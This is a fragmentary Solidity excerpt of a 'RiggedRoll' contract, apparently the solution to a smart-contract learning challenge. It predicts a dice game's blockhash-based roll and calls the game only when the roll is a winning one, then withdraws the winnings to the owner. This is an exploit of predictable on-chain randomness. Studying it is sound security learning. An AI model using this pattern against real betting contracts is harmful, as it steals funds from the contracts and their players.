...
contract RiggedRoll is Ownable {
  ...
  function riggedRoll() public {
    require(address(this).balance >= 0.002 ether, 'Must fund RiggedRoll contracts.');

    bytes32 prevHash = blockhash(block.number - 1);
    bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
    uint256 roll = uint256(hash) % 16;

    require(roll <= 2, string(abi.encodePacked('rigged roll is ', Strings.toString(roll))));
  ...
  function withdraw(address _addr, uint256 amount) public onlyOwner {
    require(address(this).balance >= amount, 'Cannot withdraw more than contract balance.');
